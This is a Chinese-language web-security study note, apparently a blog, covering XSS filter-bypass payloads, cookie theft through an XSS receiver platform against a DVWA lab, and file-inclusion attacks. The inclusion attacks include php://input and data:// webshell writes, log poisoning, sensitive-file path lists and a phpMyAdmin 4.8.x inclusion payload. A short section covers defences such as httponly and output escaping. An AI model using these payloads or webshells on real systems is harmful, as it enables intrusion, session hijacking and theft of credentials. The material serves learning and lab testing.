<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>若script这个词被过滤了，我们怎么办？</p>
<p>1、大小写转换试一试</p>
<p>2、双写script试一试</p>
<p>3、那就不用script这个单词，用事件属性onclick试一试</p>
<p>4、onclick不行，可以用onerror属性试一试？此时需要注意，因为onerror需要结合img标签使用，所以在插入的时候需要闭合原有语句的尖括号</p>
<p>5、若事件属性都不行，那么试一试伪协议？javascript:alert(1)    伪协议一般搭配href使用</p>
<p>6、如果伪协议的script这个词也被过滤了，可以试一试给script的部门字母进行实体编码，来实现绕过,实体编码在线转换：<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p>
<p>7、最后就是如果插入地址是一个超链接，我们审查元素发现有提示，地址不合法，我们可以先尝试找到一个符合其规则的合法url，然后找到它是根据该url的什么特征来判定是否合法，比如http://  这个协议来判别，那么我们就可以在我们的xss语句里写上这个协议头，然后再用双 //   注释掉这个协议头即可  ，例如：javascript:alert(1)//http://</p>
<p>尖括号&lt; &gt;被过滤怎么办？</p>
<p>假如在特殊标签下的时候，可以构造一些事件触发</p>
<p>这里如果在iinput标签下可以用：    “ autofocus onfocus=alert(1)</p>
<p>alert被过滤怎么办？</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编码；另外 prompt 和 confirm 也可以弹窗<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span> (firefox可，chrome不行)     &lt;svg/onload=prompt(1)/&gt;    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">88</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">59</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>     （alert(“XSS”);）    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)</span>&gt;</span>M         <span class="tag">&lt;<span class="name">script</span>&gt;</span>a\u006cert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>on事件被过滤怎么办？</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span> &gt;</span>    <span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">javascript&amp;colon;alert(1)</span>&gt;</span>M    <span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">“javascript:alert(document.location);”</span>&gt;</span> （firefox可）    <span class="tag">&lt;<span class="name">b</span> <span class="attr">style</span>=<span class="string">“width:</span> <span class="attr">expression</span>(<span class="attr">alert</span>(<span class="attr">document.location</span>));”&gt;</span>XSS<span class="tag">&lt;/<span class="name">b</span>&gt;</span> （IE6以下可）    <span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span> (firefox可，chrome不可)    可以执行 js 的属性: formaction action href xlink:href src content data</span><br></pre></td></tr></table></figure>



<p>其他绕过方法</p>
<p>标签和属性之间并不是只能出现空格</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iMg/src=x/**/onerror=alert(1)&gt; </span><br></pre></td></tr></table></figure>



<p>有时候并不需要一个合法的标签</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;M/onclick=&quot;alert(1)&quot;&gt;M</span><br></pre></td></tr></table></figure>



<p>使用eval动态构建关键字</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(‘ale’+’rt(<span class="number">1</span>)’);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

























<h3 id="2-4-http-only-防御"><a href="#2-4-http-only-防御" class="headerlink" title="2.4 http-only(防御)"></a>2.4 http-only(防御)</h3><p>http-only作用：给我们的cookie里添加http-only字段，这样浏览器一旦发现cookie里有http-only字段，将不运行任何javas脚本读取，这样就能防止xss读取我们的cookie</p>
<p>怎么自动给cookie添加http-only标识？</p>
<p>在源码中搜索set-cookie，然后将第7个传入的参数设为True  即可，然后去浏览器里删除cookie，接着再生成的cookie就会带上http-only标识了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&#x27;id&#x27;,$_POST[&#x27;name&#x27;],time()+3600, NULL, NULL, NULL, TRUE);setcookie(&#x27;pass&#x27;,$_POST[&#x27;password&#x27;],time()+3600, NULL, NULL, NULL, TRUE);//第七个传入的参数改为TRUE即可自动添加http-only字段</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210206121342919.png" alt="image-20210206121342919"></p>
<p>在有httponly字段后，我们执行：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210206121504533.png" alt="image-20210206121504533"></p>
<p>发现已经无法获取cookie了</p>
<h3 id="2-5-其他防御方法"><a href="#2-5-其他防御方法" class="headerlink" title="2.5 其他防御方法"></a>2.5 其他防御方法</h3><ol>
<li>阻止恶意代码注入</li>
<li>阻止恶意操作执行</li>
</ol>
<p>不管是反射型还是存储型 xss，都能通过服务端过滤进行防御：</p>
<p>黑名单：过滤特殊符号及字符<br>如&lt;、&gt;、%、#、/、”、’、;、(、)、script、svg、object、on事件等</p>
<p>白名单：只允许特定类型或符号</p>
<p>根据输入的数据特征限制使用的类型，如年龄限制为数字类型；输入类型为字符型限制为仅可使用大小写的26个字母及数字及-和_；等</p>
<p>编码及转义</p>
<p>cookie 中设置 httponly<br>setcookie 将 httponly 选项设置为 true，防范 cookie 劫持确保执行脚本来源可信</p>
<p>开发者明确告诉客户端，哪些外部资源可以加载和执行（CSP 策略）</p>
<p> 不使用有缺陷的第三方库</p>
<p>PHP：htmlentities() 、 htmlspecialchars()<br>Python：cgi.escape()<br>ASP：Server.HTMLEncode()<br>ASP.NET：Server.HtmlEncode() 、Microsoft Anti-Cross Site Scripting Library<br>Java：xssprotect(Open Source Library)<br>Node.js：node-validator<br>htmlspecialchars 默认配置是不过滤单引号的。只有设置了：quotestyle 选项为<br>ENT_QUOTES 才会过滤单引号</p>
<h2 id="3、xss平台搭建"><a href="#3、xss平台搭建" class="headerlink" title="3、xss平台搭建"></a>3、xss平台搭建</h2><p>在线xss平台：<a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt</a></p>
<p>在线平台缺陷：用的人多，所以卡</p>
<p>账号密码：painter</p>
<p>平台源码：自己搭建</p>
<p>xsser：<a target="_blank" rel="noopener" href="https://gitee.com/nMask/Resource/blob/master/xss.me.new.zip">https://gitee.com/nMask/Resource/blob/master/xss.me.new.zip</a></p>
<p>蓝莲花：<a target="_blank" rel="noopener" href="https://github.com/asw3asw/BlueLotus_XSSReceiver">https://github.com/asw3asw/BlueLotus_XSSReceiver</a></p>
<p>蓝莲花搭建教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/itest_2016/article/details/77650356">https://blog.csdn.net/itest_2016/article/details/77650356</a></p>
<p>实操教程：</p>
<p>1、去github下载源码并解压</p>
<p>2、我这边用phpstudy来安装</p>
<p>3、将源码（解压后）放到D:\phpstudy_pro\WWW目录下，可以考虑给其目录名改一下，应为源码的目录名太长，我这里改为xss，方便以后访问</p>
<p>4、启动phpstudy，打开服务，然后浏览器访问：127.0.0.1/xss   点击安装</p>
<p><img src="/source/hetian/image-20210207134630226.png" alt="image-20210207134630226"></p>
<p>5、修改密码<br>易错点：windows下搭建不需要修改权限，但是linux下需要</p>
<p><img src="/source/hetian/image-20210207134638547.png" alt="image-20210207134638547"></p>
<p>6、提交后，就可以登录了。登录密码为我自己的我的昵称</p>
<p><img src="/source/hetian/image-20210207134652547.png" alt="image-20210207134652547"></p>
<p>因为本地搭建需要在公网，所以我这里就使用别人搭建好的，<a target="_blank" rel="noopener" href="https://xss.pt/">https://xss.pt</a></p>
<p>1、新建项目——默认模块—无keepsession</p>
<p><img src="/source/hetian/image-20210206135144571.png" alt="image-20210206135144571"></p>
<p>2、查看xss语句</p>
<p><img src="/source/hetian/image-20210206135517409.png" alt="image-20210206135517409"></p>
<p><img src="/source/hetian/image-20210206135545046.png" alt="image-20210206135545046"></p>
<p>我这里用kali进行测试吧，因为kali有dvwa，用kali的dvwa进行测试</p>
<p>先设置难度为低吧</p>
<p><img src="/source/hetian/image-20210206140154990.png" alt="image-20210206140154990"></p>
<p>这里我首先用谷歌浏览器插入存储型xss（gordonb/abc123），然后用火狐浏览器登录另外一个dvwa账号进行访问有xss的页面（admin   password）</p>
<p>接着去xss平台复制xss语句</p>
<p><img src="/source/hetian/image-20210206140546214.png" alt="image-20210206140546214"></p>
<p><img src="/source/hetian/image-20210206140605593.png" alt="image-20210206140605593"></p>
<p>此时，我们再去看xss在线平台，发现已经有一条记录了，然而这条记录是作为攻击者的，接下来只要其他用户到该存在该存储型xss漏洞页面，就会获取到它的cookie</p>
<p>ok，我用火狐浏览器登录的admin，去访问该页面</p>
<p><img src="/source/hetian/image-20210206141300958.png" alt="image-20210206141300958"></p>
<p>哈哈，发现失败，找了原因，是因为火狐的dvwa等级我没调。要调成最低的，否则过滤了，调了之后，再访问，就可以了，内容为空白，就代表代码被执行</p>
<p><img src="/source/hetian/image-20210206141751161.png" alt="image-20210206141751161"></p>
<p>再看xss平台，发现已经获取到cookie了</p>
<p><img src="/source/hetian/image-20210206141934912.png" alt="image-20210206141934912"></p>
<p>那么怎么利用该获取到的cookie呢？</p>
<p>修改cookie即可，我这里在谷歌浏览器上利用cookie来登录火狐的账号，admin</p>
<p>首先，我退出谷歌浏览器上dvwa的账号：</p>
<p>接着就到了登录界面，然后按下f12—-network—-接着在网页上刷新一下，一定要刷新下哦，否则network里看不到数据包—然后点击当前页面的那个数据包</p>
<p><img src="/source/hetian/image-20210206142605296.png" alt="image-20210206142605296"></p>
<p>接着选择右边的cookie，如果被折叠起来了，就去折叠里看</p>
<p><img src="/source/hetian/image-20210206142650917.png" alt="image-20210206142650917"></p>
<p>接着再修改cookie的name和value就行了</p>
<p><img src="/source/hetian/image-20210206142728887.png" alt="image-20210206142728887"></p>
<p>我这里根据xss平台获取的cookie来修改</p>
<p>security设置为low</p>
<p>PHPSESSID设置为：gl0gvqmnnck8a4l4q1c07rq181</p>
<p>易错点：因为我的火狐</p>
<p>发现已经成功登陆</p>
<h2 id="4、xss存在判断"><a href="#4、xss存在判断" class="headerlink" title="4、xss存在判断"></a>4、xss存在判断</h2><p>当我们在一个地方插入xss语句的时候，如果我们插入的语句能在页面正常显示，那么该处就差不多无法xss了，所以得找其他的插入点，比如超链接插入功能</p>
<p>例如：<a target="_blank" rel="noopener" href="http://120.27.61.239:8080/vulnlab/stored-xss/xss_b/index.php">http://120.27.61.239:8080/vulnlab/stored-xss/xss_b/index.php</a></p>
<p>在该页面，我们插入标准的xss语句，竟然可以正常显示</p>
<p><img src="/source/hetian/image-20210208125726830.png" alt="image-20210208125726830"></p>
<p>当然，我当时做这道题的时候，审查元素查看了一遍，发现是尖括号过滤掉了，被转换成了实体字符</p>
<p>后面我尝试过双写尖括号，将尖括号转为16进制、实体字符，发现都不行</p>
<p>包括在github上的xss语句汇总里也找了好多语句进行插入，发现都不行</p>
<p>后面请教别人才知道，这里无法插入了，得另找插入点</p>
<p>由此得知，如果我们插入的语句成功显示，但是却没有达到想要的效果的时候，就不要再在这里纠结了，换一个插入点试一试</p>
<p>所以，在指点下，我找到了它插入超链接的地方</p>
<p>首先，正常插入，然后看其语句构造</p>
<p>接着构造xss语句</p>
<p><img src="/source/hetian/image-20210208130211351.png" alt="image-20210208130211351"></p>
<p><img src="/source/hetian/image-20210208130252716.png" alt="image-20210208130252716"></p>
<h1 id="第六章：文件包含"><a href="#第六章：文件包含" class="headerlink" title="第六章：文件包含"></a>第六章：文件包含</h1><h2 id="1、文件包含概述"><a href="#1、文件包含概述" class="headerlink" title="1、文件包含概述"></a>1、文件包含概述</h2><p>什么是文件包含？</p>
<p>开发人员为了减少代码量，对于相同的功能模块重复写代码，后续只需要直接调用即可</p>
<p>文件包含产生的原因</p>
<p>对包含的参数没有过滤或者定义，导致可以被利用</p>
<p>包含函数：include和require</p>
<p>include和require的区别</p>
<p>如果是用include包含另一个php文件，如果该文件不存在或者被删除（移动）了，那么这里会报错，但是报错归报错，后面的代码还会执行，比如后面有 echo“123”   那么该语句会执行</p>
<p>如果是用require包含另一个文件，那么一旦该文件不存在或者被删除（移动）了，它不仅报错，后面的代码也不执行，比如后面的 echo“123”就不会被执行</p>
<p>include、require和include_once、require_once的区别</p>
<p>前面的两个可以被包含多次，后面带once的只能被包含一次</p>
<p>如果1.php前面已经被包含一次了，后面我用include_once或者require_once再次包含1.php，那么因为once特性，相当于没被包含</p>
<p><img src="/source/hetian/image-20210208134202818.png" alt="image-20210208134202818"></p>
<p>文件包含的特性</p>
<p>当我们包含一个文件时，无论该文件的后缀名是什么，哪怕一个img或者txt文件，只要它的内容里有php语法，那么他就会按照php来执行</p>
<p>所以，我们当发现一个文件包含漏洞的时候，可以上传一个包含一句话的任意格式文件，然后包含它，就可以拿到webshell了</p>
<p>文件包含支持的协议：</p>
<p>file:// — 访问本地文件系统</p>
<p>​    比如读取：/etc/passwd</p>
<p><img src="/source/hetian/image-20210209190655990.png" alt="image-20210209190655990"></p>
<p>http:// — 访问 HTTP(s) 网址<br>ftp:// — 访问 FTP(s) URLs<br>php:// — 访问各个输入/输出流（I/O streams）</p>
<p>​    php://filter/read=convert.base64-encode/resource=../../export.php</p>
<p>​    <a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../../export.php">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../../export.php</a></p>
<p>​    </p>
<p>​    php://input         接收post的数据，将post的代码当做php来执行，需要结合hackbar的post来执行</p>
<p>​            作用：主要用来在对方服务器创建一个文件，并且写入一句话，当然也可以直接执行命令</p>
<p>​        案例一：在对方服务器创建一个php文件，并给其写入一句话</p>
<p>​            原理：通过php://input    来将我们post的数据按照php代码执行，而我们post的语句意思就是在当前目录创建一个shell.php，并给其写入一句话木马</p>
<p>​            易错点：一句话木马的美元符号￥前面必须要有转义符   \     ，否则虽然也会创建文件，但是文件内容的一句话会不完整，因为在php中，如果双引号里面的内容出现美元符号 $ 就会将其当做一个变量（单引号则不会，单引号里面出现美元符号，还是将其当做字符串处理），毕竟变量的标志就是美元符号$   ，所以最终写入的内容是残缺的，而我们的目的是写入完整的一句话，所以必须要对美元符号 $ 进行转义。 </p>
<p>​            <img src="/source/hetian/image-20210211165712905.png" alt="image-20210211165712905"></p>
<p><img src="/source/hetian/image-20210211165739906.png" alt="image-20210211165739906"></p>
<p>​        </p>
<p>正确的执行代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/dvwa/vulnerabilities/fi/?page=php://inputpost数据：    <span class="meta">&lt;?php</span> fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;<span class="meta">&lt;?php</span> @eval(\$_GET[a]);<span class="meta">?&gt;</span>&quot;) <span class="meta">?&gt;</span>通过一句话执行命令：http://127.0.0.1/dvwa/vulnerabilities/fi/?page=./shell.php&amp;a=phpinfo();</span></span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210211165349806.png" alt="image-20210211165349806"></p>
<p><img src="/source/hetian/image-20210211165404864.png" alt="image-20210211165404864"></p>
<p> 案例二：直接用php://input     执行php的命令，比如phpinfo();</p>
<p>​        易错点：因为input只是将post的数据按照php的来执行，如果我们的post的句子不符合php语法，比如没有尖括号和闭合等，那么input就会将内容显示出来，而不是执行。</p>
<p>利用语句：        </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=php://inputpost数据：	&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>​    <img src="/source/hetian/image-20210211171834562.png" alt="image-20210211171834562"></p>
<p>​        <img src="/source/hetian/image-20210211171701776.png" alt="image-20210211171701776"></p>
<p>​        </p>
<p>data:// — 数据（RFC 2397）</p>
<p>特点：和php://input 协议差不多，都是执行php代码的</p>
<p>​            有前缀，data://text/plain       和执行的php语句之间用分号  ;   来连接</p>
<p>​            如果需要进行base64编码，可以后面加分号    ;    然后说明编码方式，接着再接  逗号   ‘,’     然后接base64编码过后的代码</p>
<p>​                        例如：data://text/plain;base64,</p>
<p>区别：</p>
<p>​    php://input   必须要post，input只需要allow_url_include  开启即可</p>
<p>​    data://         必须要get，并且data还可以给执行的语句base64编码，来防止检测；需要allow_url_open和allow_url_include  同时开启</p>
<p>利用代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/dvwa/vulnerabilities/fi/?page=data://text/plain,<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>  #注意，plain和php语句之间直接连接就用逗号，如果语句被base64编码后，就需要添加base64字符串，base字符串和plain之间用分号 ;  进行连接，编码后的php语句与base64字符串之间用逗号  ,   连接      base64编码来绕过    	http://127.0.0.1/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>      这里有一个坑，<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>  编码成base64是PD9waHAgcGhwaW5mbygpOz8+IA==     这里面有一个加号（+），但是浏览器却不认识加号 + ，所以我们需要将+号转换为url编码，+号在url中就是  %2b  ，所以最终的代码是：http://127.0.0.1/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2bIA==   	或者我们写php代码的时候，后面的  <span class="meta">?&gt;</span>   这两个符号不写，因为在php中，分号  ;  就代表着结束，所以一旦有分号 ;   ，那么  <span class="meta">?&gt;</span>  就可有可无，所以这里为了方便转换为base64编码，直接编码<span class="meta">&lt;?php</span> phpinfo();   即可    </span></span><br></pre></td></tr></table></figure>



<p><img src="/source/hetian/image-20210211180331959.png" alt="image-20210211180331959"></p>
<p><img src="/source/hetian/image-20210211214030585.png" alt="image-20210211214030585"></p>
<p>​    </p>
<p>zip://            bzip2://       zlib://           — 压缩流 :即  可以访问压缩包中的子文件</p>
<p>作用：当我们上传的文件绕不过去，并且存在文件包含漏洞的话，可以上传一个压缩包，压缩包里有一个包含一句话的文件，然后通过这些压缩协议进行执行压缩包里面的木马</p>
<p>技巧：可以先将文件压缩，然后将后缀名zip改为jpg等，这样就可以更好的绕过上传，这样zip改为jpg后的文件也可以用phar来操作</p>
<p><img src="/source/hetian/image-20210211175211956.png" alt="image-20210211175211956"></p>
<p>缺点：只能使用绝对路径，使用相对路径则会报错</p>
<p>​    <img src="/source/hetian/image-20210211173856313.png" alt="image-20210211173856313"></p>
<p>易错点：</p>
<p>​    1、这三个并不是php协议，所以并不是php://zip://</p>
<p>​    2、冒号不能少，千万不能忘</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：     zip://[压缩文件绝对路径]#[压缩文件内的子文件但是在实际利用中，因为少了浏览器对url的编码，所以这里我们需要自己将 # 替换成url编码后的字符：  %23实际利用代码：zip://[压缩文件绝对路径]%23[压缩文件内的子文件			bzip2://[压缩文件绝对路径]%23[压缩文件内的子文件			zlib://[压缩文件绝对路径]%23[压缩文件内的子文件</span><br></pre></td></tr></table></figure>

<p>实例：<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/fi/?page=zip://D:%5CphpStudy%5CPHPTutorial%5CWWW%5Cdvwa%5Cvulnerabilities%5Cfi%5Cceshi.zip%23shell.txt&amp;a=phpinfo()">http://127.0.0.1/dvwa/vulnerabilities/fi/?page=zip://D:\phpStudy\PHPTutorial\WWW\dvwa\vulnerabilities\fi\ceshi.zip%23shell.txt&amp;a=phpinfo()</a>;</p>
<p><img src="/source/hetian/image-20210211173556052.png" alt="image-20210211173556052"></p>
<p>phar:// — PHP 归档</p>
<p>​    特点：也可以执行压缩包里的子文件</p>
<p>​    优点：既可以使用绝对路径，也可以使用相对路径</p>
<p>​    技巧：可以先将文件压缩，然后将后缀名zip改为jpg等，这样就可以更好的绕过上传，这样zip改为jpg后的文件也可以用phar来操作</p>
<p>​        <img src="/source/hetian/image-20210211175030686.png" alt="image-20210211175030686"></p>
<p>​    和压缩流协议的区别：</p>
<p>​            压缩包连接子文件的符号：在压缩流协议里是# 号，也就是23%     </p>
<p>​                                                        而在phar协议里是斜杠   /</p>
<p>​            路径的区别：在压缩流协议里只能使用绝对路径，而在phar里，相对路径和绝对路径都可以使用</p>
<p><img src="/source/hetian/image-20210211174117192.png" alt="image-20210211174117192"></p>
<p>glob:// — 查找匹配的文件路径模式</p>
<p>ssh2:// — Secure Shell 2<br>rar:// — RAR<br>ogg:// — 音频流<br>expect:// — 处理交互式的流</p>
<h2 id="2、本地文件包含"><a href="#2、本地文件包含" class="headerlink" title="2、本地文件包含"></a>2、本地文件包含</h2><h3 id="2-1-利用方式"><a href="#2-1-利用方式" class="headerlink" title="2.1 利用方式"></a>2.1 利用方式</h3><p>什么是本地文件包含？</p>
<p>被包含的文件在本地服务器</p>
<p>可以包含的有价值的东西</p>
<p>1、日志</p>
<p>利用原理：当我们访问一个网站的时候，我们访问的url都会记录在网站的日志文件里，我们完全可以访问一个网址，后面带上一句话木马，虽然访问后，会提示该页面不存在，但是这个错误已经记录到网站的错误日志里了，我们只需要包含该错误日志就相当于执行了一句话木马</p>
<p>意见建议：</p>
<p>​        1、优先包含error.log日志，因为这个默认是开启的，而access日志还需要单独开启</p>
<p>​        2、我们日志，可以先用常见的绝对路径试一试，如果绝对路径不对，可以试一试用 ../ 来跳转使用相对路径，可以多加点，因为就算你加的最多，也就是调到最顶级目录而已</p>
<p>linux日志路径：</p>
<p>​    绝对路径：/var/log/apache2/access.log</p>
<p>​                    /var/log/apache2/error.log</p>
<p>​    access日志（记录访问信息的日志，错误的也包括在在内）：利用方法和windows差不多，只是路径不一样</p>
<p>​    error日志(记录访问的信息系)：利用方法同理，利用方法和windows差不多，只是路径不一样</p>
<p>windows日志路径：通过相对路径来查找，毕竟我们也不确定对方的绝对路径，当然还是可以尝试下的</p>
<p>​        绝对路径：C:\phpStudy\PHPTutorial\Apache\logs\access.log</p>
<p>​                            C:\phpStudy\PHPTutorial\Apache\logs\error.log</p>
<p>​        相对路径：假设一个网站是127.0.0.1/dvwa/1.php    </p>
<p>​                        我们首先需要跳出dvwa目录，使用第一个 ../   接着就到了和dvwa同级的目录下（www），然后我们需要跳出www目录，使用第二个 ../    接着我们就到了和www的同级目录下</p>
<p><img src="/source/hetian/image-20210211094603579.png" alt="image-20210211094603579"></p>
<p>接着进入apache目录–logs—access.log   文件</p>
<p>实例：</p>
<p><img src="/source/hetian/image-20210211094846382.png" alt="image-20210211094846382"></p>
<p>​    access日志（记录成功访问信息的日志）：</p>
<p>​        前提：phpstudy的httpd-conf进行配置，搜索CustomLog  ，将其改为开启状态，就是删掉  #   注意别找错了，是   CustomLog “logs/access.log” combined</p>
<p><img src="/source/hetian/image-20210211085314197.png" alt="image-20210211085314197"></p>
<p>​    <img src="/source/hetian/image-20210211085557516.png" alt="image-20210211085557516"></p>
<p>接着我们构造url来进行访问，该url保函一句话木马</p>
<p><img src="/source/hetian/image-20210211085919376.png" alt="image-20210211085919376"></p>
<p>虽然提示无法访问，但是记录已经保存在access.log里了</p>
<p><img src="/source/hetian/image-20210211085957911.png" alt="image-20210211085957911"></p>
<p>但是我们可以发现，access.log里的一句话木马一些字符串已经被url编码了，所以我们文件包含access.log虽然会成功，但是却无法连接上一句话</p>
<p><img src="/source/hetian/image-20210211090129794.png" alt="image-20210211090129794"></p>
<p>那么怎么解决呢？</p>
<p>用burp来抓包，然后将在get请求里的url里插入一句话，这样插入的一句话就不会被url编码了</p>
<p><img src="/source/hetian/image-20210211090406060.png" alt="image-20210211090406060"></p>
<p><img src="/source/hetian/image-20210211090447865.png" alt="image-20210211090447865"></p>
<p>ok，接着我们再看看access.log的记录</p>
<p><img src="/source/hetian/image-20210211090616035.png" alt="image-20210211090616035"></p>
<p>ok，既然成功完美插入，我们就包含该日志，连接一句话，并执行phpinfo()； 命令</p>
<p><img src="/source/hetian/image-20210211090714727.png" alt="image-20210211090714727"></p>
<p>error错误日志：</p>
<p><img src="/source/hetian/image-20210211095628318.png" alt="image-20210211095628318"></p>
<p>2、包含我们上传的文件，该文件包含恶意代码，因为文件包含的文件与扩展名无关，只要该文件里有php代码，哪怕该文件扩展名是txt，它也会按照php文件来执行</p>
<p>3、敏感文件内容</p>
<p>linux下的敏感文件</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/.ssh/authorized<span class="emphasis">_keys/root/.ssh/id_</span>rsa/root/.ssh/id<span class="emphasis">_ras.keystore/root/.ssh/known_</span>hosts //记录每个访问计算机用户的公钥/etc/passwd      //账户信息/etc/shadow      //账户密码文件/etc/apache2/apache2.conf  //Apache2默认配置文件/etc/apache2/sites-available/000-default.conf //虚拟网站配置etc/php/5.6/apache2/php.ini //php相关配置/etc/my.cnf //mysql配置文件/etc/httpd/conf/httpd.conf //apache配置文件/root/.bash<span class="emphasis">_history //用户历史命令记录文件/root/.mysql_</span>history //mysql历史命令记录文件/proc/mounts //记录系统挂载设备/porc/config.gz //内核配置文件/var/lib/mlocate/mlocate.db //全文件路径/porc/self/cmdline //当前进程的cmdline参数</span><br></pre></td></tr></table></figure>

<p>windows下的敏感文件</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini //查看系统版本C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件C:\Windows\repair\sam //存储系统初次安装的密码C:\Program Files\mysql\my.ini //Mysql配置信息C:\Program Files\mysql\data\mysql\user.MYD //Mysql root密码C:\Windows\php.ini //php配置信息C:\Windows\my.ini //Mysql配置信息C:\Windows\win.ini //Windows系统的一个基本系统配置文件</span><br></pre></td></tr></table></figure>



<p>4、本地包含配合session文件</p>
<p>前提条件：phpmyadmin 4.8.0    4.8.1</p>
<p>利用点：源码里有一个为了方便我们传递参数，所以对我们传入的url进行了一次url解码</p>
<p>突破点：问号</p>
<p>漏洞利用：对  问号  进行2次编码，对问号两次编码后为：%25%33%66</p>
<p>漏洞利用方法：</p>
<p>​    1、直接包含系统文件</p>
<p>payload如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpmyadmin/index.php?target=db_export.php%25%33%66/../../../../../../../../../windows/system.ini</span><br></pre></td></tr></table></figure>



<p>2、利用本地文件包含漏洞包含.frm文件从而进行RCE</p>
<p>前提：需要在数据库里操作</p>
<p>l利用方法：    </p>
<p>​    在phpadmin里创建一个数据库，这里假设为test</p>
<p>​    然后再在test里创建一个表，这里假设为6666</p>
<p>​    最后再在6666这个表里添加字段，其中一个字段的名称插入一句话木马</p>
<p><img src="/source/hetian/image-20210211150811888.png" alt="image-20210211150811888"></p>
<p>添加成功后，系统会自动在C:\xampp\mysql\data\test   生成f6666.frm文件，该文件的内容里包含我们的一句话</p>
<p>如果不知道frm文件路径，可以通过phpadmin查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like ‘%datadir%’;#这里查询出来的只是data目录的路径，如果我们创建的是test数据库，6666.frm表，那么它的绝对路径就是：C:\xampp\mysql\data\test\6666.frm </span><br></pre></td></tr></table></figure>

<p>利用payload：在浏览器里执行</p>
